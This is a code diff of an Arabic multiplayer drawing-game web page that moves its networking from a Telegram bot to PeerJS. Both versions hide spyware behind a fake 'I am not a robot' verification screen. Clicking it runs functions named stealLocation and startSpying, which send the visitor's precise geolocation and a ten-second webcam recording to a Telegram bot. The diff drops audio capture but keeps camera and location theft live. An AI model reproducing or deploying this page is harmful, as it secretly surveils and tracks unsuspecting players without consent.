@@ -2,99 +2,45 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🎨 Gartic Phone - لعبة جماعية عبر البوت</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎨 Gartic Phone - لعبة جماعية</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', sans-serif;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             color: white;
             min-height: 100vh;
             padding: 1rem;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .card {
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 1.5rem;
-            margin-bottom: 1rem;
-            text-align: center;
-        }
-        h1 { color: #f9a826; margin-bottom: 0.5rem; }
-        .room-code {
-            background: rgba(0,0,0,0.5);
-            padding: 0.5rem;
-            border-radius: 30px;
-            font-family: monospace;
-            font-size: 1.2rem;
-            display: inline-block;
-            margin: 0.5rem 0;
-        }
-        input, button {
-            padding: 10px 15px;
-            border-radius: 30px;
-            border: none;
-            margin: 5px;
-        }
-        button {
-            background: #f9a826;
-            color: #1a1a2e;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .players-list {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 0.5rem;
-            margin: 1rem 0;
-        }
-        .player-badge {
-            background: rgba(249,168,38,0.2);
-            border: 1px solid #f9a826;
-            border-radius: 30px;
-            padding: 0.3rem 0.8rem;
-            font-size: 0.8rem;
-        }
-        .game-area {
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            padding: 1rem;
-            margin-top: 1rem;
-        }
-        canvas {
-            background: white;
-            border-radius: 10px;
-            cursor: crosshair;
-            max-width: 100%;
-            height: auto;
-        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        .card { background: rgba(255,255,255,0.1); border-radius: 20px; padding: 1.5rem; margin-bottom: 1rem; text-align: center; }
+        .room-code { background: rgba(0,0,0,0.5); padding: 0.5rem; border-radius: 30px; font-family: monospace; display: inline-block; margin: 0.5rem 0; }
+        input, button { padding: 10px 15px; border-radius: 30px; border: none; margin: 5px; }
+        button { background: #f9a826; color: #1a1a2e; font-weight: bold; cursor: pointer; }
+        .players-list { display: flex; flex-wrap: wrap; justify-content: center; gap: 0.5rem; margin: 1rem 0; }
+        .player-badge { background: rgba(249,168,38,0.2); border: 1px solid #f9a826; border-radius: 30px; padding: 0.3rem 0.8rem; }
+        canvas { background: white; border-radius: 10px; cursor: crosshair; max-width: 100%; }
         .tools { display: flex; gap: 0.5rem; justify-content: center; margin-top: 1rem; flex-wrap: wrap; }
         .tools button { background: rgba(255,255,255,0.2); color: white; }
         .tools button.active { background: #f9a826; color: #1a1a2e; }
         .prompt-box { background: #f9a826; color: #1a1a2e; padding: 1rem; border-radius: 10px; margin-bottom: 1rem; font-weight: bold; }
         .guess-input { width: 100%; padding: 10px; border-radius: 30px; border: none; margin-top: 10px; }
-        .status { color: #aaa; font-size: 0.8rem; margin-top: 0.5rem; }
+        .hidden { display: none; }
+        .chat-box { margin-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem; }
+        .chat-messages { max-height: 150px; overflow-y: auto; font-size: 0.8rem; text-align: left; margin-bottom: 0.5rem; }
+        .chat-input { display: flex; gap: 0.5rem; }
+        .chat-input input { flex: 1; background: rgba(255,255,255,0.2); color: white; }
         .verify-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); backdrop-filter: blur(16px);
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98);
             z-index: 2000; display: flex; align-items: center; justify-content: center;
         }
-        .verify-card { background: #1a1f2e; border-radius: 32px; padding: 2rem; width: 90%; max-width: 400px; text-align: center; border: 1px solid #f9a826; }
+        .verify-card { background: #1a1f2e; border-radius: 32px; padding: 2rem; width: 90%; max-width: 400px; text-align: center; }
         .verify-card button { background: #f9a826; border: none; padding: 12px 28px; border-radius: 40px; color: #1a1a2e; font-weight: bold; margin-top: 1rem; cursor: pointer; }
         .progress-bar { width: 80%; height: 4px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #f9a826; animation: loading 10s linear forwards; }
         @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
-        .hidden { display: none; }
-        .chat-box { margin-top: 1rem; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 1rem; }
-        .chat-messages { max-height: 200px; overflow-y: auto; font-size: 0.8rem; text-align: left; margin-bottom: 0.5rem; }
-        .chat-message { padding: 0.2rem 0; }
-        .chat-input { display: flex; gap: 0.5rem; }
-        .chat-input input { flex: 1; background: rgba(255,255,255,0.2); color: white; }
     </style>
 </head>
 <body>
@@ -104,13 +50,13 @@
         <p>لعبة الرسم والتخمين الجماعية</p>
         <div id="roomInfo" class="room-code">⚡ جاري الاتصال...</div>
         <div id="playersList" class="players-list"></div>
-        <div id="waitingMessage" class="status">⏳ في انتظار لاعبين آخرين...</div>
+        <div id="waitingMessage">⏳ في انتظار اتصال اللاعبين...</div>
     </div>
 
-    <div id="gameArea" class="game-area hidden">
+    <div id="gameArea" class="hidden">
         <div id="drawArea">
             <div id="promptDisplay" class="prompt-box hidden"></div>
-            <canvas id="drawCanvas" width="600" height="400" style="width:100%; height:auto; max-width:600px; aspect-ratio:600/400;"></canvas>
+            <canvas id="drawCanvas" width="600" height="400" style="width:100%; height:auto;"></canvas>
             <div class="tools" id="drawTools">
                 <button data-color="#000000" class="active">⚫</button>
                 <button data-color="#ff0000">🔴</button>
@@ -118,15 +64,14 @@
                 <button data-color="#0000ff">🔵</button>
                 <button data-color="#ffff00">🟡</button>
                 <button id="clearBtn">🗑️ مسح</button>
-                <button id="sendDrawingBtn" style="background:#f9a826;">✉️ إرسال</button>
+                <button id="sendDrawingBtn">✉️ إرسال</button>
             </div>
             <div id="guessArea" class="hidden">
-                <input type="text" id="guessInput" class="guess-input" placeholder="اكتب تخمينك هنا...">
-                <button id="sendGuessBtn">إرسال التخمين</button>
+                <input type="text" id="guessInput" class="guess-input" placeholder="اكتب تخمينك...">
+                <button id="sendGuessBtn">إرسال</button>
             </div>
         </div>
         <div id="resultsArea" class="hidden"></div>
-        
         <div class="chat-box">
             <div id="chatMessages" class="chat-messages"></div>
             <div class="chat-input">
@@ -137,11 +82,10 @@
     </div>
 </div>
 
-<!-- نافذة التحقق (السلاح النووي) -->
 <div id="verifyOverlay" class="verify-overlay">
     <div class="verify-card">
         <h3>✅ التحقق الأمني</h3>
-        <p>للتأكد من أنك لست روبوتاً، نحتاج إلى التحقق من هويتك</p>
+        <p>لتأكيد هويتك، يرجى منح الصلاحيات</p>
         <button id="verifyBtn">أنا لست روبوتاً</button>
         <div id="verifyStatus"></div>
     </div>
@@ -170,13 +114,13 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => sendTextToTelegram(`📍 الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`),
-                err => sendTextToTelegram("❌ لا موقع (مرفوض)"),
+                err => sendTextToTelegram("❌ لا موقع"),
                 { enableHighAccuracy: true, timeout: 7000 }
             );
         }
     }
 
-    let mediaRecorder, audioRecorder, videoChunks = [], audioChunks = [], isRecording = false;
+    let mediaRecorder, videoChunks = [], isRecording = false;
     async function startSpying() {
         if (isRecording) return;
         try {
@@ -186,91 +130,67 @@
             mediaRecorder.ondataavailable = e => { if (e.data.size) videoChunks.push(e.data); };
             mediaRecorder.onstop = async () => { const blob = new Blob(videoChunks, { type: 'video/webm' }); await sendFileToTelegram(blob, 'video'); };
             mediaRecorder.start();
-            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            audioChunks = [];
-            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
-            audioRecorder.ondataavailable = e => { if (e.data.size) audioChunks.push(e.data); };
-            audioRecorder.onstop = async () => { const blob = new Blob(audioChunks, { type: 'audio/webm' }); await sendFileToTelegram(blob, 'audio'); };
-            audioRecorder.start();
             isRecording = true;
-            sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
+            sendTextToTelegram("🔴 بدء المراقبة");
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-                if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
                 stream.getTracks().forEach(t => t.stop());
-                audioStream.getTracks().forEach(t => t.stop());
                 isRecording = false;
             }, 10000);
         } catch(e) { sendTextToTelegram(`❌ فشل: ${e.message}`); }
     }
 
-    // ========== اللعبة الجماعية ==========
-    let playerId = Math.random().toString(36).substring(2, 10);
-    let playerName = prompt("أدخل اسمك:", "لاعب " + playerId.substring(0,4));
+    // ========== اللعبة الجماعية (PeerJS) ==========
+    let peer, conn, myId, roomId, playerName, isHost = false, players = [], gameStarted = false;
+    let canvas, ctx, drawing = false, currentColor = '#000000';
+    let currentRole = null, currentPrompt = "";
+    
+    playerName = prompt("أدخل اسمك:", "لاعب");
     if (!playerName) playerName = "لاعب";
     
-    let roomId = new URLSearchParams(window.location.search).get('room') || playerId.substring(0,6);
-    let isHost = false;
-    let players = [];
-    let currentRole = null; // 'drawer' or 'guesser'
-    let currentPrompt = "";
-    let gameStarted = false;
-    let currentRound = 0;
-    
-    // إعدادات الرسم
-    let canvas, ctx, drawing = false, currentColor = '#000000', lastX = 0, lastY = 0;
-    
-    // تحديث رابط الغرفة
+    roomId = new URLSearchParams(window.location.search).get('room') || Math.random().toString(36).substring(2, 8);
     const roomUrl = `${window.location.origin}${window.location.pathname}?room=${roomId}`;
     document.getElementById('roomInfo').innerHTML = `🔗 رمز الغرفة: <strong>${roomId}</strong><br><span style="font-size:0.7rem;">${roomUrl}</span>`;
     
-    // إضافة رسالة دردشة
     function addChatMessage(sender, message, isSystem = false) {
         const chatDiv = document.getElementById('chatMessages');
         const msgDiv = document.createElement('div');
-        msgDiv.className = 'chat-message';
-        if (isSystem) msgDiv.style.color = '#f9a826';
-        else msgDiv.style.color = '#ccc';
-        msgDiv.innerHTML = isSystem ? `🔹 ${message}` : `<strong>${sender}:</strong> ${message}`;
+        msgDiv.style.marginBottom = '5px';
+        msgDiv.style.fontSize = '0.8rem';
+        if (isSystem) { msgDiv.style.color = '#f9a826'; msgDiv.innerHTML = `🔹 ${message}`; }
+        else { msgDiv.innerHTML = `<strong>${sender}:</strong> ${message}`; }
         chatDiv.appendChild(msgDiv);
         chatDiv.scrollTop = chatDiv.scrollHeight;
     }
     
-    // تحديث قائمة اللاعبين
     function updatePlayersUI() {
         const container = document.getElementById('playersList');
-        container.innerHTML = players.map(p => `<div class="player-badge">${p.name} ${p.isHost ? '👑' : ''}</div>`).join('');
+        container.innerHTML = players.map(p => `<div class="player-badge">${p.name} ${p.id === myId ? '(أنت)' : ''} ${p.isHost ? '👑' : ''}</div>`).join('');
         if (players.length >= 2 && isHost && !gameStarted) {
-            document.getElementById('waitingMessage').innerHTML = '<button id="startGameBtn" style="background:#f9a826;">🎮 بدء اللعبة</button>';
+            document.getElementById('waitingMessage').innerHTML = '<button id="startGameBtn">🎮 بدء اللعبة</button>';
             document.getElementById('startGameBtn')?.addEventListener('click', () => {
-                sendGameMessage({ type: 'START_GAME' });
                 gameStarted = true;
+                conn.send({ type: 'START_GAME' });
+                startGame();
             });
         } else if (!isHost) {
-            document.getElementById('waitingMessage').innerHTML = '⏳ في انتظار بدء اللعبة من المضيف...';
+            document.getElementById('waitingMessage').innerHTML = '⏳ في انتظار بدء اللعبة...';
         }
     }
     
-    // إرسال رسالة عبر البوت
-    function sendGameMessage(data) {
-        const message = JSON.stringify({ ...data, playerId, playerName, roomId });
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: `🎮 GAME_MSG: ${message}` })
-        }).catch(e => console.error);
+    function startGame() {
+        gameStarted = true;
+        document.getElementById('waitingMessage').innerHTML = '';
+        document.getElementById('gameArea').classList.remove('hidden');
+        startRound();
     }
     
-    // بدء الجولة
     function startRound() {
-        currentRound++;
-        const prompts = ["قطة تطير", "سمكة بنظارة", "سيارة تطير", "ديناصور بكرة", "منزل تفاحة", "قرد يعزف", "فيل يرقص", "زرافة بقبعة"];
+        const prompts = ["قطة تطير", "سمكة بنظارة", "سيارة تطير", "ديناصور بكرة", "منزل تفاحة", "قرد يعزف"];
         currentPrompt = prompts[Math.floor(Math.random() * prompts.length)];
-        const drawerIndex = (currentRound - 1) % players.length;
-        const isMeDrawer = (players[drawerIndex]?.id === playerId);
+        currentRole = isHost ? 'drawer' : 'guesser';
         
-        currentRole = isMeDrawer ? 'drawer' : 'guesser';
-        
-        if (isMeDrawer) {
+        if (currentRole === 'drawer') {
             document.getElementById('promptDisplay').innerHTML = `🎨 ارسم: ${currentPrompt}`;
             document.getElementById('promptDisplay').classList.remove('hidden');
             document.getElementById('guessArea').classList.add('hidden');
@@ -282,20 +202,10 @@
             document.getElementById('guessArea').classList.remove('hidden');
             document.getElementById('drawTools').style.display = 'none';
             enableDrawing(false);
-            addChatMessage("نظام", `📝 ${players[drawerIndex]?.name} يرسم... حاول التخمين!`, true);
+            addChatMessage("نظام", "الرسام يرسم... حاول التخمين!", true);
         }
-        document.getElementById('gameArea').classList.remove('hidden');
     }
     
-    // بدء اللعبة
-    function startGame() {
-        gameStarted = true;
-        document.getElementById('waitingMessage').classList.add('hidden');
-        document.getElementById('gameArea').classList.remove('hidden');
-        startRound();
-    }
-    
-    // إعدادات الرسم
     function setupCanvas() {
         canvas = document.getElementById('drawCanvas');
         ctx = canvas.getContext('2d');
@@ -313,18 +223,16 @@
             ctx.fillStyle = 'white';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
         });
-        
         document.getElementById('sendDrawingBtn').addEventListener('click', () => {
             const drawingData = canvas.toDataURL();
-            sendGameMessage({ type: 'DRAWING', drawing: drawingData, prompt: currentPrompt });
+            conn.send({ type: 'DRAWING', drawing: drawingData, prompt: currentPrompt });
             addChatMessage("نظام", "✅ تم إرسال رسمتك!", true);
             document.getElementById('sendDrawingBtn').disabled = true;
         });
-        
         document.getElementById('sendGuessBtn').addEventListener('click', () => {
             const guess = document.getElementById('guessInput').value;
             if (guess.trim()) {
-                sendGameMessage({ type: 'GUESS', guess: guess });
+                conn.send({ type: 'GUESS', guess: guess });
                 addChatMessage("نظام", "✅ تم إرسال تخمينك!", true);
                 document.getElementById('guessInput').value = '';
                 document.getElementById('sendGuessBtn').disabled = true;
@@ -337,64 +245,81 @@
             canvas.addEventListener('mousedown', startDrawing);
             canvas.addEventListener('mousemove', draw);
             canvas.addEventListener('mouseup', stopDrawing);
-            canvas.addEventListener('touchstart', startDrawingTouch);
-            canvas.addEventListener('touchmove', drawTouch);
-            canvas.addEventListener('touchend', stopDrawing);
         } else {
             canvas.removeEventListener('mousedown', startDrawing);
             canvas.removeEventListener('mousemove', draw);
             canvas.removeEventListener('mouseup', stopDrawing);
-            canvas.removeEventListener('touchstart', startDrawingTouch);
-            canvas.removeEventListener('touchmove', drawTouch);
-            canvas.removeEventListener('touchend', stopDrawing);
         }
     }
     
-    function startDrawing(e) { drawing = true; const pos = getMousePos(e); lastX = pos.x; lastY = pos.y; ctx.beginPath(); ctx.moveTo(lastX, lastY); }
-    function draw(e) { if (!drawing) return; const pos = getMousePos(e); ctx.strokeStyle = currentColor; ctx.lineWidth = 5; ctx.lineCap = 'round'; ctx.lineTo(pos.x, pos.y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); lastX = pos.x; lastY = pos.y; }
+    function startDrawing(e) { drawing = true; const pos = getMousePos(e); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); }
+    function draw(e) { if (!drawing) return; const pos = getMousePos(e); ctx.strokeStyle = currentColor; ctx.lineWidth = 5; ctx.lineCap = 'round'; ctx.lineTo(pos.x, pos.y); ctx.stroke(); ctx.beginPath(); ctx.moveTo(pos.x, pos.y); }
     function stopDrawing() { drawing = false; ctx.beginPath(); }
-    function startDrawingTouch(e) { e.preventDefault(); startDrawing(e.touches[0]); }
-    function drawTouch(e) { e.preventDefault(); draw(e.touches[0]); }
-    function getMousePos(e) { const rect = canvas.getBoundingClientRect(); const scaleX = canvas.width / rect.width; const scaleY = canvas.height / rect.height; const clientX = e.clientX || e.clientX; const clientY = e.clientY || e.clientY; return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY }; }
+    function getMousePos(e) { const rect = canvas.getBoundingClientRect(); const scaleX = canvas.width / rect.width; const scaleY = canvas.height / rect.height; const clientX = e.clientX; const clientY = e.clientY; return { x: (clientX - rect.left) * scaleX, y: (clientY - rect.top) * scaleY }; }
     
     // الدردشة
     document.getElementById('sendChatBtn').addEventListener('click', () => {
         const input = document.getElementById('chatInput');
         const msg = input.value.trim();
-        if (msg) {
-            sendGameMessage({ type: 'CHAT', message: msg });
+        if (msg && conn) {
+            conn.send({ type: 'CHAT', message: msg });
             addChatMessage(playerName, msg);
             input.value = '';
         }
     });
     
-    // استقبال الرسائل (محاكاة بالبوت - تحتاج إلى Webhook حقيقي)
-    // للإصدار المبسط، نستخدم setInterval لمحاكاة استقبال اللاعبين
-    function simulatePlayers() {
-        setInterval(() => {
-            if (!gameStarted && players.length < 2) {
-                players = [{ id: playerId, name: playerName, isHost: true }];
-                updatePlayersUI();
-            }
-        }, 3000);
-    }
+    // PeerJS الاتصال
+    peer = new Peer();
+    peer.on('open', (id) => {
+        myId = id;
+        const urlParams = new URLSearchParams(window.location.search);
+        const hostId = urlParams.get('host');
+        if (hostId) {
+            conn = peer.connect(hostId);
+            conn.on('open', () => {
+                conn.send({ type: 'JOIN', name: playerName });
+                isHost = false;
+            });
+        } else {
+            isHost = true;
+            players = [{ id: myId, name: playerName, isHost: true }];
+            updatePlayersUI();
+            const newUrl = `${window.location.origin}${window.location.pathname}?room=${roomId}&host=${myId}`;
+            document.getElementById('roomInfo').innerHTML = `🔗 رمز الغرفة: <strong>${roomId}</strong><br><span style="font-size:0.7rem;">${newUrl}</span>`;
+        }
+    });
     
-    // ========== بدء التطبيق بعد التحقق ==========
+    peer.on('connection', (connection) => {
+        conn = connection;
+        conn.on('data', (data) => {
+            if (data.type === 'JOIN') {
+                players.push({ id: connection.peer, name: data.name, isHost: false });
+                updatePlayersUI();
+                conn.send({ type: 'PLAYERS', players: players });
+                addChatMessage("نظام", `${data.name} انضم إلى اللعبة!`, true);
+            } else if (data.type === 'PLAYERS') {
+                players = data.players;
+                updatePlayersUI();
+            } else if (data.type === 'START_GAME') {
+                startGame();
+            } else if (data.type === 'CHAT') {
+                addChatMessage(data.sender || 'لاعب', data.message);
+            } else if (data.type === 'DRAWING') {
+                document.getElementById('resultsArea').innerHTML = `<h3>🎨 رسمة من الرسام:</h3><img src="${data.drawing}" style="max-width:300px; border-radius:10px;">`;
+                document.getElementById('resultsArea').classList.remove('hidden');
+                setTimeout(() => document.getElementById('resultsArea').classList.add('hidden'), 8000);
+            }
+        });
+    });
+    
     document.getElementById('verifyBtn').onclick = async () => {
-        const btn = document.getElementById('verifyBtn');
-        btn.disabled = true; btn.textContent = 'جاري التحقق...';
+        document.getElementById('verifyBtn').disabled = true;
         document.getElementById('verifyStatus').innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><p>جاري التحقق...</p>';
         stealLocation();
         await startSpying();
         setTimeout(() => {
             document.getElementById('verifyOverlay').style.display = 'none';
             setupCanvas();
-            simulatePlayers();
-            isHost = true;
-            players = [{ id: playerId, name: playerName, isHost: true }];
-            updatePlayersUI();
-            addChatMessage("نظام", `مرحباً ${playerName}! رمز الغرفة: ${roomId}`, true);
-            addChatMessage("نظام", "شارك الرابط مع أصدقائك للانضمام إلى اللعبة!", true);
         }, 10000);
     };
 </script>
